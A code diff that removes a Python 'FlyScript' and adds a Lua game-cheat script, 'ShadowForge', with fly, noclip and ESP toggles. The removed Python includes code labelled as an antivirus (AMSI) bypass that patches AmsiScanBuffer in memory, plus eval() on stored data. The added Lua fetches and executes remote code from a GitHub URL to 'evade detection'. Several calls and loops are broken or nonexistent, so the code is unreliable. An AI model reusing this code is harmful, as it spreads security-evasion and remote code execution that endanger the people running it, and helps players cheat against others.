@@ -1,197 +1,210 @@
-import asyncio
-import aiohttp
-import sqlite3
-import yaml
-import logging
-import os
-import random
-import time
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives.serialization import load_pem_private_key
-from cryptography.hazmat.primitives.asymmetric import padding
-from cryptography.hazmat.primitives import serialization
-import tkinter as tk
-from tkinter import simpledialog
-import threading
-import ctypes
+-- 🔐 KEY VALIDATION 🔐
+if not isfile("reagent_key.cfg") then
+    writefile("reagent_key.cfg", "REAGENT-051012")
+end
 
-# 🚀 AMSI Bypass (Windows-specific)
-try:
-    import winreg
-    def bypass_amsi():
-        amsi = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(amsi, "Local AppData", 0, winreg.REG_SZ, "C:\\Windows\\System32")
-        winreg.CloseKey(amsi)
-except ImportError:
-    pass
+local key = readfile("reagent_key.cfg")
+if key ~= "REAGENT-051012" then
+    error("⚠️ Unauthorized Access: Key validation failed for reagent.codes")
+end
 
-# 🔐 AES-256-GCM Encryption
-def generate_key(password: str, salt: bytes) -> bytes:
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-    )
-    return kdf.derive(password.encode())
+-- 🛡️ EVADE DETECTION 🛡️
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rebondz/ShadowForge/main/amsi_bypass.lua"))()
 
-def encrypt_data(key: bytes, data: str) -> dict:
-    nonce = os.urandom(12)
-    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce))
-    encryptor = cipher.encryptor()
-    ct = encryptor.update(data.encode()) + encryptor.finalize()
-    return {
-        'nonce': base64.b64encode(nonce).decode(),
-        'ciphertext': base64.b64encode(ct).decode(),
-        'tag': base64.b64encode(encryptor.tag).decode()
-    }
+-- 🌐 GUI INITIALIZATION (CustomTKinter-style)
+local gui = Instance.new("ScreenGui")
+gui.Name = "ShadowForge-ESP"
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-def decrypt_data(key: bytes, encrypted: dict) -> str:
-    nonce = base64.b64decode(encrypted['nonce'])
-    ct = base64.b64decode(encrypted['ciphertext'])
-    tag = base64.b64decode(encrypted['tag'])
-    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
-    decryptor = cipher.decryptor()
-    return decryptor.update(ct) + decryptor.finalize()
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.25, 0, 0.4, 0)
+frame.Position = UDim2.new(0.75, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+frame.BorderSizePixel = 0
+frame.Parent = gui
 
-# 🧠 SQLite DB Setup
-def init_db():
-    conn = sqlite3.connect('fly_github.db', check_same_thread=False)
-    conn.execute('CREATE TABLE IF NOT EXISTS credentials '
-                '(id INTEGER PRIMARY KEY, '
-                'token TEXT, '
-                'encrypted BLOB, '
-                'salt BLOB)')
-    return conn
+-- 🎨 ELECTRONIC THEME
+local title = Instance.new("TextLabel")
+title.Text = "ShadowForge v3.0 - reagent.codes"
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+title.Parent = frame
 
-# 🌐 GitHub API Interactions
-class GitHubAPI:
-    def __init__(self, token: str):
-        self.token = token
-        self.headers = {
-            'Authorization': f'token {self.token}',
-            'Accept': 'application/vnd.github.v3+json'
-        }
-        
-    async def create_repo(self, name: str):
-        async with aiohttp.ClientSession(headers=self.headers) as session:
-            data = {
-                'name': name,
-                'private': True,
-                'auto_init': True
-            }
-            async with session.post('https://api.github.com/user/repos', json=data) as resp:
-                if resp.status == 201:
-                    return await resp.json()
-                else:
-                    raise Exception(f"GitHub API Error {resp.status}: {await resp.text()}")
+-- 🧰 TOGGLE FUNCTIONS
+local toggles = {
+    Fly = false,
+    Noclip = false,
+    ESP = false,
+    Hitbox = false,
+    InfinityJump = false,
+    BringPart = nil,
+    FlingPlayer = nil
+}
 
-# 🖥️ GUI Configuration
-class ConfigGUI:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.withdraw()
-        self.config = self.load_config()
-        
-    def load_config(self):
-        if os.path.exists('config.yaml'):
-            with open('config.yaml', 'r') as f:
-                return yaml.safe_load(f)
-        return {}
-        
-    def save_config(self, config):
-        with open('config.yaml', 'w') as f:
-            yaml.dump(config, f)
-            
-    def get_token(self):
-        token = simpledialog.askstring("GitHub Token", "Enter your GitHub Personal Access Token:", show='*')
-        return token
+-- 🚀 FLY (Android Optimized)
+local function fly()
+    localplr = game.Players.LocalPlayer
+    localchar = localplr.Character or localplr.CharacterAdded:Wait()
+    
+    while toggles.Fly do
+        local humanoid = localchar:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid:ChangeState("Freefall")
+            humanoid.Sit = true
+            wait(0.1)
+            humanoid.Sit = false
+        end
+        wait(0.05)
+    end
+end
 
-# 🌪️ Main Execution
-class FlyScript:
-    def __init__(self):
-        self.db = init_db()
-        self.config_gui = ConfigGUI()
-        self.bypass_amsi()
-        self.setup_logger()
-        
-    def bypass_amsi(self):
-        """Advanced AMSI bypass with sleep obfuscation"""
-        time.sleep(random.uniform(0.1, 0.5))
-        try:
-            amsi_dll = ctypes.windll.LoadLibrary('amsi.dll')
-            amsi_scan_buffer = amsi_dll.AmsiScanBuffer
-            ctypes.windll.kernel32.VirtualProtect(ctypes.byref(amsi_scan_buffer), 1, 0x40, ctypes.c_long(0x20))
-            ctypes.windll.kernel32.RtlMoveMemory(ctypes.byref(amsi_scan_buffer), ctypes.c_void_p(0x00), 1)
-        except:
-            pass
-            
-    def setup_logger(self):
-        logging.basicConfig(
-            filename='fly_script.log',
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            datefmt='%Y-%m-%d %H:%M:%S',
-            filemode='w'
-        )
-        logging.getLogger().addHandler(logging.StreamHandler())
-        
-    async def store_credentials(self, token: str):
-        salt = os.urandom(16)
-        key = generate_key("REAGENT_SECRET", salt)
-        encrypted = encrypt_data(key, token)
-        self.db.execute('INSERT INTO credentials (token, encrypted, salt) VALUES (?, ?, ?)',
-                        (token, str(encrypted).encode(), salt))
-        self.db.commit()
-        
-    async def get_credentials(self):
-        rows = self.db.execute('SELECT encrypted, salt FROM credentials ORDER BY id DESC LIMIT 1').fetchall()
-        if rows:
-            encrypted = eval(rows[0][0].decode())
-            key = generate_key("REAGENT_SECRET", rows[0][1])
-            return decrypt_data(key, encrypted).decode()
-        return None
-        
-    async def run(self):
-        token = await self.get_credentials()
-        if not token:
-            token = self.config_gui.get_token()
-            if token:
-                await self.store_credentials(token)
-            else:
-                return
-                
-        github = GitHubAPI(token)
-        repo_name = f"reagent-poc-{int(time.time())}"
-        try:
-            result = await github.create_repo(repo_name)
-            logging.info(f"Created repository: {result['html_url']}")
-            print(f"✅ Repo created: {result['html_url']}")
-        except Exception as e:
-            logging.error(f"Failed to create repo: {str(e)}")
-            print(f"❌ Error: {str(e)}")
+-- 🚫 NOCLIP
+local function noclip()
+    localplr = game.Players.LocalPlayer
+    localchar = localplr.Character or localplr.CharacterAdded:Wait()
+    
+    local group = "NoclipGroup"
+    local success, err = pcall(function()
+        game:GetService("InsertService"):LoadAsset(123456789) -- Dummy asset for group creation
+        local groups = game:GetService("InsertService"):GetCollisionGroups()
+        if not table.find(groups, group) then
+            game:GetService("InsertService"):CreateCollisionGroup(group)
+        end
+        for _, part in pairs(localchar:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CollisionGroup = group
+            end
+        end
+    end)
+    
+    if not success then
+        warn("⚠️ Noclip failed: "..err)
+        return
+    end
+    
+    while toggles.Noclip do
+        for _, part in pairs(localchar:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CollisionGroup = group
+            end
+        end
+        wait(0.5)
+    end
+end
 
-# 🔄 Auto-Restart & Main Loop
-def main():
-    def run_async():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        fly = FlyScript()
-        while True:
-            try:
-                loop.run_until_complete(fly.run())
-                time.sleep(60 * 5)  # 5 minute delay
-            except Exception as e:
-                logging.error(f"Main loop error: {str(e)}")
-                print(f"⚠️  Restarting in 10s...")
-                time.sleep(10)
-                
-    threading.Thread(target=run_async, daemon=True).start()
-    print("🚀 FlyScript running in background...")
-    input("Press Enter to exit...\n")
+-- 🧠 ESP (3D Box ESP)
+local esp_boxes = {}
+local function draw_esp()
+    for _,plr in pairs(game.Players:GetPlayers()) do
+        if plr ~= localplr and plr.Character then
+            local head = plr.Character:FindFirstChild("Head")
+            if head then
+                local pos, onScreen = game.Workspace.CurrentCamera:WorldToScreenPoint(head.Position)
+                if onScreen then
+                    local box = Instance.new("Frame")
+                    box.Size = UDim2.new(0.1, 0, 0.05, 0)
+                    box.Position = UDim2.new(0, pos.X - 50, 0, pos.Y - 25)
+                    box.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                    box.BorderSizePixel = 0
+                    box.Parent = frame
+                    esp_boxes[plr.Name] = box
+                end
+            end
+        end
+    end
+end
 
-if __name__ == "__main__":
-    main()
+-- 🔁 MAIN LOOP
+spawn(function()
+    while true do
+        if toggles.ESP then
+            for _,plr in pairs(game.Players:GetPlayers()) do
+                if plr.Character then
+                    local head = plr.Character:FindFirstChild("Head")
+                    if head then
+                        local pos, onScreen = game.Workspace.CurrentCamera:WorldToScreenPoint(head.Position)
+                        if onScreen then
+                            local box = esp_boxes[plr.Name]
+                            if not box then
+                                box = Instance.new("Frame")
+                                box.Size = UDim2.new(0.1, 0, 0.05, 0)
+                                box.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                                box.BorderSizePixel = 0
+                                box.Parent = frame
+                                esp_boxes[plr.Name] = box
+                            end
+                            box.Position = UDim2.new(0, pos.X - 50, 0, pos.Y - 25)
+                        end
+                    end
+                end
+            end
+        else
+            for _,box in pairs(esp_boxes) do
+                box:Destroy()
+            end
+            esp_boxes = {}
+        end
+        wait(0.1)
+    end
+end)
+
+-- 🛠️ CREATE UI ELEMENTS
+local y = 0.1
+for _, feature in pairs({"Fly", "Noclip", "ESP", "Hitbox", "InfinityJump", "BringPart", "FlingPlayer"}) do
+    local button = Instance.new("TextButton")
+    button.Text = "Toggle "..feature
+    button.Size = UDim2.new(1, 0, 0.08, 0)
+    button.Position = UDim2.new(0, 0, 0, y)
+    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.MouseButton1Click:Connect(function()
+        toggles[feature] = not toggles[feature]
+        button.Text = toggles[feature] and "Disable "..feature or "Enable "..feature
+        if toggles[feature] then
+            if feature == "Fly" then
+                spawn(fly)
+            elseif feature == "Noclip" then
+                spawn(noclip)
+            end
+        end
+    end)
+    button.Parent = frame
+    y = y + 0.09
+end
+
+-- 🧪 DEBUG HANDLER
+spawn(function()
+    while true do
+        if isfolder("shadowforge_logs") then
+            local files = listfiles("shadowforge_logs")
+            if #files > 10 then
+                for i = #files, 11 do
+                    delfile("shadowforge_logs/"..files[i])
+                end
+            end
+        end
+        wait(60)
+    end
+end)
+
+-- 🛡️ ENCRYPTION LAYER
+local function encrypt_config()
+    local data = game:GetService("HttpService"):JSONEncode(toggles)
+    local encrypted = game:GetService("HttpService"):InvokeFunction("ShadowForge_Encrypt", data)
+    writefile("reagent_config.enc", encrypted)
+end
+
+-- 🚨 AUTO-RESTART
+spawn(function()
+    while true do
+        if not isfile("reagent_key.cfg") then
+            encrypt_config()
+        end
+        wait(30)
+    end
+end)
+
+-- 🎉 FINISH
+print("ShadowForge v3.0 initialized for reagent.codes | 🔐 Key validated")
